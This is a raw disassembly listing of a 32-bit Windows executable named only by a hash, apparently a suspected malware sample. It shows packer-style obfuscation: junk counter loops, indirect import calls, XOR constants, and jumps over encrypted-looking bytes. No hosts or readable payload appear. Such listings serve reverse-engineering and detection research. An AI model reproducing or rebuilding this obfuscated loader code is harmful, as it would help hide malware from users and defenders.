
aec2b5aea812e00697514ce5e7d8751acfdb5fc499d58b64283a34981c96e6fd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    ecx,0x4d2f
  40100a:	add    BYTE PTR [eax],al
  40100c:	add    al,BYTE PTR [eax]
  40100e:	add    BYTE PTR [eax],al
  401010:	cmp    al,BYTE PTR [eax]
  401012:	add    BYTE PTR [eax],al
  401014:	add    BYTE PTR [eax],al
  401016:	add    DWORD PTR [eax],eax
  401018:	add    BYTE PTR [edx-0x74ab0000],bh
  40101e:	in     al,dx
  40101f:	sub    esp,0x30
  401022:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  401029:	mov    eax,ds:0x44536c
  40102e:	adc    eax,DWORD PTR ds:0x445380
  401034:	mov    ds:0x44536c,eax
  401039:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  401040:	xor    ecx,0x17d8
  401046:	mov    ecx,DWORD PTR [ebp-0x4]
  401049:	push   ebx
  40104a:	and    DWORD PTR ds:0x43fbec,0x0
  401054:	xor    eax,eax
  401056:	add    eax,DWORD PTR ds:0x43fbec
  40105c:	inc    eax
  40105d:	mov    ds:0x43fbec,eax
  401062:	cmp    DWORD PTR ds:0x43fbec,0xa
  401069:	jne    0x40108c
  40106f:	push   DWORD PTR [ebp-0x10]
  401072:	push   DWORD PTR [ebp-0x28]
  401075:	push   DWORD PTR [ebp-0x20]
  401078:	push   0x74f6
  40107d:	push   DWORD PTR [ebp-0x24]
  401080:	push   DWORD PTR [ebp-0x28]
  401083:	push   DWORD PTR [ebp-0x20]
  401086:	call   DWORD PTR ds:0x43c5a4
  40108c:	cmp    DWORD PTR ds:0x43fbec,0x9
  401093:	jne    0x4010a4
  401099:	mov    eax,ds:0x43fbec
  40109e:	inc    eax
  40109f:	mov    ds:0x43fbec,eax
  4010a4:	cmp    DWORD PTR ds:0x43fbec,0x17
  4010ab:	jb     0x401054
  4010b1:	add    DWORD PTR ds:0x43fbd8,ecx
  4010b7:	mov    eax,0x7510857
  4010bc:	xor    ecx,eax
  4010be:	xor    DWORD PTR ds:0x4427b4,0x226
  4010c8:	mov    ebx,0x32729e
  4010cd:	not    DWORD PTR ds:0x4427b8
  4010d3:	jmp    0x4011a6
  4010d8:	dec    esi
  4010d9:	dec    edx
  4010da:	xor    al,0x5c
  4010dc:	fcom   DWORD PTR [edx+0x66]
  4010df:	jp     0x4010bd
  4010e1:	test   DWORD PTR [ebx+0x58],0x3a573ffd
  4010e8:	jl     0x401166
  4010ea:	jl     0x401168
  4010ec:	mov    ds:0xcc7c7c7c,al
  4010f1:	(bad)  
  4010f2:	xor    ecx,ebx
  4010f4:	xor    eax,0xccddcfdb
  4010f9:	ja     0x401171
  4010fb:	or     ecx,DWORD PTR [edi]
  4010fd:	push   0xf3b0f0a
  401102:	retf   0x3712
  401105:	sbb    bl,BYTE PTR [edi]
  401107:	mov    ch,0x52
  401109:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40110f:	rol    esp,cl
  401111:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401118:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40111e:	out    dx,al
  40111f:	outs   dx,DWORD PTR ds:[esi]
  401120:	add    ebx,DWORD PTR ds:0x4ac4729e
  401126:	mov    al,ds:0x36dd215b
  40112b:	mov    eax,ds:0xa3c97380
  401131:	je     0x401169
  401133:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401139:	jecxz  0x401175
  40113b:	and    ebp,0x4f
  40113e:	aam    0x94
  401140:	dec    ebp
  401141:	inc    DWORD PTR [edi-0x2f5a886e]
  401147:	mov    cl,0x41
  401149:	loope  0x40116f
  40114b:	pop    ecx
  40114c:	sub    edi,DWORD PTR [eax-0x41639320]
  401152:	jae    0x401171
  401154:	retf   
  401155:	cwde   
  401156:	sub    eax,0xc85ce3c6
  40115b:	(bad)  
  40115c:	mov    dl,0xfa
  40115e:	loopne 0x4010f8
  401160:	cmp    eax,0xc76966cf
  401165:	sub    al,cl
  401167:	or     ch,dl
  401169:	sbb    eax,0xb39945d
  40116e:	outs   dx,DWORD PTR ds:[esi]
  40116f:	ins    DWORD PTR es:[edi],dx
  401170:	jb     0x401174
  401172:	cmp    eax,0x22468cd1
  401177:	jns    0x4011f8
  401179:	cmp    al,0x8f
  40117b:	add    bl,dl
  40117d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40117e:	add    edx,DWORD PTR [ebx+0x59]
  401181:	rol    esp,1
  401183:	add    eax,0x15d55edb
  401188:	jge    0x401126
  40118a:	mov    ah,0x43
  40118c:	daa    
  40118d:	sbb    DWORD PTR [ebx],esp
  40118f:	addr16 and eax,0x4f3cdb10
  401195:	loop   0x401165
  401197:	xchg   esi,eax
  401198:	sbb    ah,BYTE PTR [ebx+0x1b]
  40119b:	gs jp  0x4011dc
  40119e:	mov    WORD PTR [esi+edx*2],cs
  4011a1:	out    dx,eax
  4011a2:	jle    0x4011e8
  4011a4:	mov    ah,0xb0
  4011a6:	add    ecx,ebx
  4011a8:	adc    DWORD PTR ds:0x413412,0x445370
  4011b2:	mov    DWORD PTR [ebp-0x1c],ecx
  4011b5:	xor    DWORD PTR ds:0x4105cf,0x5a6f
  4011bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4011c2:	adc    DWORD PTR ds:0x44536c,0x41340e
  4011cc:	jmp    0x40129f
  4011d1:	inc    edi
  4011d2:	in     eax,0x24
  4011d4:	xor    bh,BYTE PTR [edx+0x6b7d7dcd]
  4011da:	inc    ebp
  4011db:	in     al,dx
  4011dc:	xchg   BYTE PTR [edi-0x5d6fd3e1],dh
  4011e2:	jl     0x401260
  4011e4:	jl     0x401188
  4011e6:	jl     0x401264
  4011e8:	jl     0x40117e
  4011ea:	push   ds
  4011eb:	outs   dx,DWORD PTR ds:[esi]
  4011ec:	cmp    esp,DWORD PTR [edx-0x4e]
  4011ef:	adc    ebx,ebp
  4011f1:	mov    ebp,0x32a3efdd
  4011f6:	sbb    esp,DWORD PTR [ebp+0x7f]
  4011f9:	imul   esi,edx,0x8eb7a4c8
  4011ff:	sahf   
  401200:	outs   dx,DWORD PTR ds:[esi]
  401201:	mov    bl,0xa9
  401203:	mov    edx,esi
  401205:	dec    eax
  401206:	adc    ecx,ebp
  401208:	cmp    eax,0x7fdd30e2
  40120d:	dec    esp
  40120e:	daa    
  40120f:	out    dx,eax
  401210:	scas   al,BYTE PTR es:[edi]
  401211:	out    dx,al
  401212:	shl    BYTE PTR [eax+0x68f96087],1
  401218:	pop    ecx
  401219:	jo     0x401263
  40121b:	push   ecx
  40121c:	and    bh,BYTE PTR [edi-0x2e]
  40121f:	xchg   ebp,eax
  401220:	add    DWORD PTR [ecx+0x58],ecx
  401223:	call   0x5c2f689e
  401228:	xlat   BYTE PTR ds:[ebx]
  401229:	or     dh,bl
  40122b:	sbb    BYTE PTR [ebp-0x3f],0xa6
  40122f:	mov    ch,0x20
  401231:	mov    dh,BYTE PTR [ecx]
  401233:	xchg   ecx,eax
  401234:	das    
  401235:	add    DWORD PTR [eax-0x62],esp
  401238:	cli    
  401239:	cmp    edx,DWORD PTR [ebx+0x7c6024e4]
  40123f:	jbe    0x401205
  401241:	xor    eax,0x436260c5
  401246:	imul   ebp,DWORD PTR [eax],0xf1addaa3
  40124c:	sbb    BYTE PTR [ecx-0x6b786a8],bl
  401252:	call   0x613c:0x89b069d3
  401259:	pop    ds
  40125a:	push   0x4
  40125c:	push   0xffffffaa
  40125e:	retf   0x1a0d
  401261:	dec    esi
  401262:	sub    bl,BYTE PTR [esi]
  401264:	mov    esi,0x56ed480d
  401269:	jmp    0xd63ba0
  40126e:	sub    BYTE PTR [ebp+0x30],ah
  401271:	clc    
  401272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401273:	pop    edi
  401274:	sbb    DWORD PTR [ebp+eax*2-0x5e5aed4b],edi
  40127b:	ror    DWORD PTR [esi+0x47],0x57
  40127f:	push   edi
  401280:	bound  esp,QWORD PTR ds:0x99f842be
  401286:	dec    edi
  401287:	sar    esp,1
  401289:	fs mov edx,0xd39479d0
  40128f:	out    0xac,eax
  401291:	clc    
  401292:	mov    al,bl
  401294:	lods   eax,DWORD PTR ds:[esi]
  401295:	or     BYTE PTR [edx],dh
  401297:	je     0x4012dd
  401299:	or     al,BYTE PTR [eax+0x7980d635]
  40129f:	push   esi
  4012a0:	push   edi
  4012a1:	test   ecx,ecx
  4012a3:	mov    DWORD PTR ds:0x413416,0x53ab
  4012ad:	je     0x401398
  4012b3:	and    ecx,ecx
  4012b5:	mov    ecx,DWORD PTR [ebp+0x14]
  4012b8:	and    edi,edi
  4012ba:	jmp    0x40138d
  4012bf:	xchg   DWORD PTR [edi-0x31],eax
  4012c2:	or     ecx,edi
  4012c4:	mov    ebx,DWORD PTR [ebx+0x5b]
  4012c7:	dec    esi
  4012c8:	popa   
  4012c9:	enter  0x4cfc,0x22
  4012cd:	xor    ah,BYTE PTR [eax-0x18]
  4012d0:	jg     0x40134e
  4012d2:	jl     0x401276
  4012d4:	jl     0x401352
  4012d6:	jl     0x40130d
  4012d8:	into   
  4012d9:	xchg   esp,eax
  4012da:	dec    edi
  4012db:	xor    al,0xcc
  4012dd:	sub    BYTE PTR [eax+0x78d9739a],dh
  4012e3:	ins    BYTE PTR es:[edi],dx
  4012e4:	mov    ah,0x46
  4012e6:	and    edi,DWORD PTR [edx+0x79]
  4012e9:	xchg   ebp,eax
  4012ea:	cli    
  4012eb:	xchg   ebp,eax
  4012ec:	add    eax,0x82adc64d
  4012f1:	cdq    
  4012f2:	cs mov ds,ebp
  4012f5:	inc    edi
  4012f6:	xor    DWORD PTR [esp+ecx*4+0x59],0x76
  4012fb:	cmc    
  4012fc:	rcr    DWORD PTR [ebp+0x6a],1
  4012ff:	pop    edx
  401300:	fiadd  WORD PTR [edx]
  401302:	adc    al,0xab
  401304:	loopne 0x40135a
  401306:	enter  0xb82d,0x73
  40130a:	dec    eax
  40130b:	fcomp  DWORD PTR [ecx+0x9]
  40130e:	shl    BYTE PTR [edx-0x2819bc6],0x50
  401315:	je     0x401367
  401317:	fldenv [ebx]
  401319:	or     esp,0xc5217e9e
  40131f:	pop    edx
  401320:	test   dh,bh
  401322:	pop    esi
  401323:	fwait
  401324:	sbb    bh,bh
  401326:	sub    eax,0xe7690767
  40132b:	stos   BYTE PTR es:[edi],al
  40132c:	inc    esi
  40132d:	aam    0xa6
  40132f:	test   eax,0xd488a3a4
  401334:	enter  0xbf1e,0xe3
  401338:	and    eax,0x8142254
  40133d:	test   al,0x10
  40133f:	cmp    cl,cl
  401341:	add    dl,0x3
  401344:	add    bl,bh
  401346:	mov    eax,ds:0x62311532
  40134b:	cmc    
  40134c:	push   ds
  40134d:	adc    esp,DWORD PTR [eax+0x18]
  401350:	or     BYTE PTR [esi-0x32],ah
  401353:	jbe    0x4012eb
  401355:	adc    DWORD PTR [ecx-0x30],edx
  401358:	jnp    0x4012f5
  40135a:	mov    DWORD PTR [ecx+ebp*2],ebp
  40135d:	fs retf 
  40135f:	push   0x44d33e0d
  401364:	rcl    BYTE PTR [ebx-0x32c12fd0],0x6b
  40136b:	arpl   WORD PTR [ebx],si
  40136d:	jne    0x4013d5
  40136f:	gs xor eax,0x625b2809
  401375:	(bad)  
  401376:	xchg   ebx,eax
  401377:	xlat   BYTE PTR ds:[ebx]
  401378:	mov    bh,0xd
  40137a:	and    bh,BYTE PTR [ebx-0x8c7dc0a]
  401380:	(bad)  
  401381:	mov    ds:0x581c3e7e,eax
  401386:	fadd   QWORD PTR [ebx+0x30e6f40b]
  40138c:	jne    0x401319
  40138e:	or     DWORD PTR [ecx],ebp
  401390:	sbb    eax,0x4105cf
  401395:	mov    DWORD PTR [ebp-0x1c],ecx
  401398:	sbb    esi,ecx
  40139a:	imul   edx,eax
  40139d:	and    DWORD PTR ds:0x41340e,0x618e
  4013a7:	mov    ecx,0x4573
  4013ac:	mov    DWORD PTR ds:0x4427b0,0x19
  4013b6:	cmp    DWORD PTR ds:0x4427b0,0x0
  4013bd:	je     0x4013f3
  4013c3:	cmp    DWORD PTR ds:0x4427b0,0x1a
  4013ca:	jne    0x4013d9
  4013d0:	push   DWORD PTR [ebp-0x1c]
  4013d3:	call   DWORD PTR ds:0x43c818
  4013d9:	xor    edi,edi
  4013db:	or     edi,DWORD PTR ds:0x4427b0
  4013e1:	dec    edi
  4013e2:	mov    DWORD PTR ds:0x4427b0,edi
  4013e8:	jmp    0x4013b6
  4013ed:	xor    DWORD PTR ds:0x43fbd8,edx
  4013f3:	add    edx,ecx
  4013f5:	inc    edi
  4013f6:	mov    esi,0x7879
  4013fb:	add    DWORD PTR ds:0x4427c0,edx
  401401:	mov    edi,0x1556
  401406:	sub    DWORD PTR ds:0x43fbfc,0x4105cb
  401410:	xchg   esi,ecx
  401412:	xor    DWORD PTR ds:0x445378,ecx
  401418:	sub    edx,edi
  40141a:	or     ecx,0x50d4
  401420:	xor    esi,esi
  401422:	mov    DWORD PTR [ebp-0x28],esi
  401425:	movzx  ecx,WORD PTR ds:0x445378
  40142c:	xor    DWORD PTR ds:0x44536c,ecx
  401432:	mov    DWORD PTR [ebp-0x2c],esi
  401435:	or     ecx,0x6619
  40143b:	mov    DWORD PTR [ebp-0x14],esi
  40143e:	mov    ecx,DWORD PTR ds:0x4105d7
  401444:	xor    DWORD PTR ds:0x413406,ecx
  40144a:	jmp    0x40151d
  40144f:	ficom  WORD PTR [esi+0x7b7d5fa5]
  401455:	loop   0x401400
  401457:	sbb    al,0x21
  401459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40145a:	out    dx,eax
  40145b:	pop    ecx
  40145c:	cmp    dh,bh
  40145e:	fstp   DWORD PTR [esi]
  401460:	jle    0x4014de
  401462:	jl     0x401406
  401464:	jl     0x4014e2
  401466:	jl     0x4014a8
  401468:	and    DWORD PTR [edi+0x66],eax
  40146b:	fdivr  DWORD PTR [esi]
  40146d:	stos   DWORD PTR es:[edi],eax
  40146e:	sbb    ah,BYTE PTR [esi-0x3e]
  401471:	(bad)  
  401472:	inc    eax
  401473:	mov    esi,0xc8e891a4
  401478:	loopne 0x401411
  40147a:	loop   0x40140e
  40147c:	sbb    DWORD PTR [edx],edx
  40147e:	aas    
  40147f:	or     ebx,esp
  401481:	xchg   esp,eax
  401482:	fldcw  WORD PTR [edi+0x6009e7d1]
  401488:	arpl   WORD PTR ds:0xee4468da,bp
  40148e:	ret    0xd3a
  401491:	daa    
  401492:	shl    DWORD PTR [edi-0x26],1
  401495:	out    dx,al
  401496:	ror    DWORD PTR [ecx+0x27],cl
  401499:	jae    0x4014b0
  40149b:	sub    al,0x78
  40149d:	push   ebx
  40149e:	pushf  
  40149f:	(bad)  es:[ebp+0x694d9330]
  4014a6:	mov    edi,0xb995ead
  4014ab:	push   esi
  4014ac:	jbe    0x40150a
  4014ae:	xor    eax,0xbb0fc12d
  4014b3:	mov    ds:0x22efb21b,al
  4014b8:	leave  
  4014b9:	xchg   edi,eax
  4014ba:	stc    
  4014bb:	pusha  
  4014bc:	mov    al,0x26
  4014be:	jge    0x4014a2
  4014c0:	call   0x70c4:0x95aa576b
  4014c7:	sbb    ebx,DWORD PTR [ebx]
  4014c9:	stc    
  4014ca:	xchg   esp,eax
  4014cb:	test   eax,0x9387aa2d
  4014d0:	in     eax,dx
  4014d1:	jns    0x4014c2
  4014d3:	(bad)  
  4014d4:	xor    BYTE PTR [edi-0x7750dca5],dh
  4014da:	loopne 0x40151c
  4014dc:	xor    esp,DWORD PTR [esi-0x5a]
  4014df:	in     al,dx
  4014e0:	jbe    0x4014e7
  4014e2:	sbb    eax,0xb3a2fd20
  4014e7:	or     DWORD PTR [edi],edx
  4014e9:	push   edx
  4014ea:	cdq    
  4014eb:	mov    ds:0x14d1326a,eax
  4014f0:	cmp    esp,eax
  4014f2:	sub    cl,BYTE PTR [ebp+0x5]
  4014f5:	mov    bh,0x1d
  4014f7:	test   DWORD PTR [edx],ebp
  4014f9:	daa    
  4014fa:	and    DWORD PTR [ebp+edx*2-0x2f9a1565],eax
  401501:	mov    ebp,0x372239cf
  401506:	cmc    
  401507:	sub    edi,DWORD PTR [edx*1+0x5dc6ad32]
  40150e:	xor    dh,BYTE PTR [ecx]
  401510:	mov    ebp,DWORD PTR [ecx-0x2]
  401513:	pop    esp
  401514:	jb     0x401500
  401516:	push   ecx
  401517:	cmp    DWORD PTR [edx],0x5b
  40151a:	push   esi
  40151b:	cwde   
  40151c:	jp     0x4014a7
  40151e:	jne    0x401518
  401520:	jmp    0x4015f3
  401525:	add    DWORD PTR [eax],edi
  401527:	repz push esp
  401529:	lods   eax,DWORD PTR ds:[esi]
  40152a:	addr16 std 
  40152c:	jge    0x401526
  40152e:	stc    
  40152f:	icebp  
  401530:	sahf   
  401531:	(bad)  
  401532:	out    dx,eax
  401533:	add    edx,DWORD PTR [edi+0x44]
  401536:	jle    0x4015b4
  401538:	jl     0x4014dc
  40153a:	jl     0x4015b8
  40153c:	jl     0x4014e1
  40153e:	sar    BYTE PTR [esi+0x7d],1
  401541:	arpl   WORD PTR [ebp-0x50],cx
  401544:	test   eax,0xf9c72350
  401549:	sbb    ebp,DWORD PTR [ecx-0x75]
  40154c:	lock inc esp
  40154e:	lods   eax,DWORD PTR ds:[esi]
  40154f:	pop    eax
  401550:	shr    DWORD PTR [esi-0x590f6079],cl
  401556:	sbb    esp,esi
  401558:	fidiv  DWORD PTR [esi+0x49]
  40155b:	jmp    0xc9328ca7
  401560:	push   0xdcede6a9
  401565:	jle    0x40151b
  401567:	aaa    
  401568:	out    0xb5,al
  40156a:	shl    DWORD PTR [eax+0x2bd1276d],cl
  401570:	scas   eax,DWORD PTR es:[edi]
  401571:	ror    DWORD PTR [ebx+edx*2-0x10],cl
  401575:	dec    ecx
  401576:	add    al,0x5f
  401578:	in     al,0xe3
  40157a:	jmp    0xbbc3:0x56c597d1
  401581:	xchg   ebp,eax
  401582:	pop    eax
  401583:	inc    ebp
  401584:	fidiv  WORD PTR [esi+edi*4+0x72]
  401588:	cmc    
  401589:	or     eax,0x607834cf
  40158e:	push   ecx
  40158f:	rcl    BYTE PTR [ebx],0xcd
  401592:	sub    DWORD PTR [esi+0x4b59fc2a],ecx
  401598:	jnp    0x40154e
  40159a:	cmp    ebp,DWORD PTR ss:[ebp+0x5c]
  40159e:	and    ecx,DWORD PTR [edi+0x2c]
  4015a1:	popf   
  4015a2:	pusha  
  4015a3:	jnp    0x4015f6
  4015a5:	or     ax,0x3964
  4015a9:	es enter 0x6223,0xca
  4015ae:	add    esi,DWORD PTR [edx+esi*1+0x4fe84784]
  4015b5:	fld    QWORD PTR [esi]
  4015b7:	mov    ecx,0x36e3e4e8
  4015bc:	xchg   BYTE PTR [edx],ch
  4015be:	xor    eax,0xeed64308
  4015c3:	imul   edx,eax,0x36
  4015c6:	out    dx,al
  4015c7:	neg    DWORD PTR [edi-0x6b0c4dce]
  4015cd:	sub    DWORD PTR [eax],esp
  4015cf:	mov    dh,0xb7
  4015d1:	loope  0x401572
  4015d3:	pop    ebp
  4015d4:	xchg   DWORD PTR [ebp-0x1a3415e2],ecx
  4015da:	pop    ebx
  4015db:	je     0x4015c6
  4015dd:	sub    dl,ch
  4015df:	dec    esi
  4015e0:	pop    ds
  4015e1:	addr16 jge 0x40164f
  4015e4:	dec    ebx
  4015e5:	repz xchg edx,eax
  4015e7:	mov    fs,WORD PTR [eax+0x15]
  4015ea:	ror    BYTE PTR [ebx],0x73
  4015ed:	repz xor dl,BYTE PTR [edi+0x46]
  4015f1:	in     eax,0xad
  4015f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4015f6:	sbb    DWORD PTR ds:0x4105c3,0x4105c7
  401600:	xor    ecx,eax
  401602:	mov    DWORD PTR ds:0x4105cb,0x13
  40160c:	cmp    DWORD PTR ds:0x4105cb,0x0
  401613:	je     0x401657
  401619:	cmp    DWORD PTR ds:0x4105cb,0x2
  401620:	jne    0x40162f
  401626:	push   DWORD PTR [ebp-0xc]
  401629:	call   DWORD PTR ds:0x43c81c
  40162f:	cmp    DWORD PTR ds:0x4105cb,0x3
  401636:	jne    0x401647
  40163c:	mov    eax,ds:0x4105cb
  401641:	dec    eax
  401642:	mov    ds:0x4105cb,eax
  401647:	mov    eax,ds:0x4105cb
  40164c:	dec    eax
  40164d:	mov    ds:0x4105cb,eax
  401652:	jmp    0x40160c
  401657:	xor    edi,edi
  401659:	add    ecx,ebx
  40165b:	mov    eax,ds:0x41341a
  401660:	mov    DWORD PTR [ebp-0x20],ecx
  401663:	mov    eax,DWORD PTR [ebp-0x20]
  401666:	mov    DWORD PTR ds:0x4105c7,0x348
  401670:	je     0x402298
  401676:	mov    eax,DWORD PTR [ebp-0x4]
  401679:	xor    DWORD PTR ds:0x4427b0,0x445368
  401683:	xor    eax,0x7510857
  401688:	jmp    0x40175b
  40168d:	in     eax,0x57
  40168f:	iret   
  401690:	call   0x2571:0x577dba5d
  401697:	mov    esi,0xb1eac6a
  40169c:	xchg   edx,eax
  40169d:	mov    dh,BYTE PTR [ecx+0x7c]
  4016a0:	jl     0x401644
  4016a2:	jl     0x401720
  4016a4:	jl     0x4016eb
  4016a6:	dec    edx
  4016a7:	loope  0x40162c
  4016a9:	sub    eax,0xb46327f4
  4016ae:	pusha  
  4016af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016b0:	xchg   esi,eax
  4016b1:	or     DWORD PTR fs:[ebp-0xb],ecx
  4016b5:	and    DWORD PTR [edi+ebx*4+0x12f962bc],ebp
  4016bc:	xor    al,BYTE PTR ds:0xa1d4e4c9
  4016c2:	icebp  
  4016c3:	div    BYTE PTR [ecx+0x2f]
  4016c6:	lock (bad) 
  4016c8:	ins    DWORD PTR es:[edi],dx
  4016c9:	mov    BYTE PTR [esi],bl
  4016cb:	push   0xb3a7b517
  4016d0:	clc    
  4016d1:	mov    DWORD PTR [edi+0x57],eax
  4016d4:	out    0x98,al
  4016d6:	jge    0x401692
  4016d8:	push   esp
  4016d9:	scas   al,BYTE PTR es:[edi]
  4016da:	call   0xaef804d5
  4016df:	fst    DWORD PTR [edi+0x2e8ee9f]
  4016e5:	(bad)
  4016ea:	adc    DWORD PTR [ebx-0x6f],esp
  4016ed:	sbb    dh,ah
  4016ef:	sub    BYTE PTR [esi],0xda
  4016f2:	mov    ds:0xf5486f85,al
  4016f7:	or     BYTE PTR [ecx-0x44],cl
  4016fa:	xchg   edx,eax
  4016fb:	push   cs
  4016fc:	xor    bh,BYTE PTR [ebp+0x5089e0d9]
  401702:	outs   dx,DWORD PTR ds:[esi]
  401703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401704:	pop    ds
  401705:	mov    al,ds:0xe382cbe5
  40170a:	sbb    al,0xd
  40170c:	add    al,0x56
  40170e:	mov    al,ds:0x91ad3e99
  401713:	into   
  401714:	xor    BYTE PTR [esi+0x3a366d3e],al
  40171a:	out    0xe7,eax
  40171c:	scas   al,BYTE PTR es:[edi]
  40171d:	xlat   BYTE PTR ds:[ebx]
  40171e:	push   ecx
  40171f:	and    esp,DWORD PTR [edi]
  401721:	rol    DWORD PTR [edx],1
  401723:	push   edx
  401724:	popa   
  401725:	std    
  401726:	add    DWORD PTR [eax+0x5c],eax
  401729:	daa    
  40172a:	mov    edx,0xb55ec757
  40172f:	or     BYTE PTR [ecx-0x1],ch
  401732:	xchg   ebx,eax
  401733:	stc    
  401734:	fiadd  WORD PTR [esi-0x405f997e]
  40173a:	add    ecx,DWORD PTR [ebp+0x65]
  40173d:	data16 jp 0x4016e8
  401740:	mov    ss,ebx
  401742:	xor    BYTE PTR [ebx],dh
  401744:	xchg   DWORD PTR [ecx-0xdf6822a],edx
  40174a:	imul   eax,DWORD PTR [ecx-0x21997e3a],0x3e
  401751:	pushf  
  401752:	dec    ebx
  401753:	add    BYTE PTR [ecx-0xb27aa35],0x71
  40175a:	push   ebx
  40175b:	add    eax,ebx
  40175d:	mov    DWORD PTR ds:0x43fbfc,0x156f
  401767:	cmp    edi,eax
  401769:	mov    DWORD PTR ds:0x44536c,0x5e58
  401773:	jne    0x401eef
  401779:	push   DWORD PTR [ebp+0x8]
  40177c:	add    DWORD PTR ds:0x4427bc,0x43fbf8
  401786:	call   0x409b25
  40178b:	mov    DWORD PTR ds:0x44536c,0x72d4
  401795:	mov    DWORD PTR [ebp-0x20],eax
  401798:	and    DWORD PTR ds:0x4105bf,0x0
  4017a2:	jmp    0x4017b4
  4017a7:	mov    ecx,DWORD PTR ds:0x4105bf
  4017ad:	inc    ecx
  4017ae:	mov    DWORD PTR ds:0x4105bf,ecx
  4017b4:	cmp    DWORD PTR ds:0x4105bf,0x16
  4017bb:	jae    0x4018af
  4017c1:	cmp    DWORD PTR ds:0x4105bf,0x25
  4017c8:	jne    0x4017d7
  4017ce:	push   DWORD PTR [ebp-0x1c]
  4017d1:	call   DWORD PTR ds:0x43c820
  4017d7:	jmp    0x4017a7
  4017dc:	jmp    0x4018af
  4017e1:	fdiv   st(2),st
  4017e3:	jmp    0xef7a:0x5462fa52
  4017ea:	into   
  4017eb:	outs   dx,DWORD PTR ds:[esi]
  4017ec:	inc    ecx
  4017ed:	fs ins DWORD PTR es:[edi],dx
  4017ef:	adc    ecx,DWORD PTR [ebp+0x7c7c7030]
  4017f5:	mov    ds:0x1d7c7c7c,al
  4017fa:	jbe    0x4017ad
  4017fc:	pop    eax
  4017fd:	inc    edi
  4017fe:	fmul   DWORD PTR [esi+0x5d]
  401801:	sub    ah,bl
  401803:	pop    ebx
  401804:	inc    esi
  401805:	test   ch,dl
  401807:	xchg   ecx,eax
  401808:	add    ecx,DWORD PTR [eax+0x46]
  40180b:	test   eax,0x6c9eabf2
  401810:	cs cli 
  401812:	mov    WORD PTR [ecx+eax*4-0x4a],es
  401816:	arpl   WORD PTR [ecx+0x7d],di
  401819:	test   DWORD PTR [bx+si+0x6d],0x3bd16cab
  401821:	and    ch,BYTE PTR [edx+edx*4]
  401824:	imul   DWORD PTR [eax+0x2ba3828d]
  40182a:	es xchg ebp,eax
  40182c:	inc    eax
  40182d:	imul   esi,edi,0xc70f1d3e
  401833:	push   0xffffffe9
  401835:	or     ebx,DWORD PTR [eax+0x33f6f421]
  40183b:	arpl   WORD PTR [edx],cx
  40183d:	pop    edi
  40183e:	call   0x1543:0x1091311b
  401845:	mov    BYTE PTR [eax+0x513ca3d5],0x8f
  40184c:	sbb    BYTE PTR ds:0x1bf70a32,al
  401852:	sbb    al,0x67
  401854:	inc    ebx
  401855:	lock xchg esp,eax
  401857:	dec    ebx
  401858:	sbb    bl,cl
  40185a:	and    eax,0xb78295fb
  40185f:	xor    DWORD PTR [esi+0x1b6b31b4],ebp
  401865:	jbe    0x401873
  401867:	mov    esi,0x53257755
  40186c:	(bad)  
  40186e:	mov    ah,BYTE PTR [esi-0x3c228f11]
  401874:	shr    bh,0x83
  401877:	loop   0x401851
  401879:	adc    dl,BYTE PTR [edi+0x77]
  40187c:	mov    ds:0xd7a4a712,eax
  401881:	push   es
  401882:	sbb    BYTE PTR [esi+0x18],ah
  401885:	xchg   ecx,eax
  401886:	xchg   DWORD PTR [ecx-0xe],edx
  401889:	loopne 0x4018aa
  40188b:	into   
  40188c:	add    esp,eax
  40188e:	sbb    eax,0x5b3f0d84
  401893:	jbe    0x40182f
  401895:	sub    al,0x6e
  401897:	ret    0x8e02
  40189a:	fs cmp DWORD PTR fs:[ebp-0x5bacaf01],edx
  4018a2:	add    al,BYTE PTR [edi]
  4018a4:	hlt    
  4018a5:	aad    0xae
  4018a7:	jns    0x401850
  4018a9:	je     0x401889
  4018ab:	push   esp
  4018ac:	or     eax,0x458b1df6
  4018b1:	cld    
  4018b2:	xor    DWORD PTR ds:0x445364,edi
  4018b8:	mov    ecx,DWORD PTR [ebp-0x20]
  4018bb:	adc    DWORD PTR ds:0x4427ac,ebx
  4018c1:	mov    esi,0x7510857
  4018c6:	xor    eax,esi
  4018c8:	adc    DWORD PTR ds:0x43fbe4,0x41341a
  4018d2:	add    eax,ebx
  4018d4:	mov    DWORD PTR ds:0x43fbf0,0x1172
  4018de:	cmp    ecx,eax
  4018e0:	mov    DWORD PTR ds:0x43fbf4,0x309e
  4018ea:	je     0x4021a9
  4018f0:	sub    DWORD PTR ds:0x4105cb,0x4105c3
  4018fa:	push   DWORD PTR [ebp-0x20]
  4018fd:	jmp    0x4019d0
  401902:	js     0x40197b
  401904:	dec    ecx
  401905:	mov    bh,BYTE PTR [ebp+0x4a]
  401908:	jnp    0x401903
  40190a:	hlt    
  40190b:	push   esi
  40190c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40190d:	imul   edi,DWORD PTR [edx],0x28
  401910:	or     DWORD PTR [esi+0x66],ecx
  401913:	jo     0x401991
  401915:	jl     0x4018b9
  401917:	jl     0x401995
  401919:	jl     0x4018d1
  40191b:	cld    
  40191c:	and    dl,dh
  40191e:	addr16 je 0x4018f3
  401921:	outs   dx,BYTE PTR ds:[esi]
  401922:	sub    ecx,DWORD PTR ds:0x4ab72c20
  401928:	loopne 0x401924
  40192a:	stc    
  40192b:	jae    0x4019a5
  40192d:	jge    0x40192a
  40192f:	setb   BYTE PTR [eax+0x3fdb7938]
  401936:	pop    ds
  401937:	sbb    al,0x52
  401939:	push   ebx
  40193a:	inc    ecx
  40193b:	inc    edx
  40193c:	jns    0x4018e6
  40193e:	pop    edx
  40193f:	add    eax,0x8d9ba3e7
  401944:	arpl   WORD PTR [esi-0x7ad4c9c6],di
  40194a:	push   ebp
  40194b:	add    al,0x5b
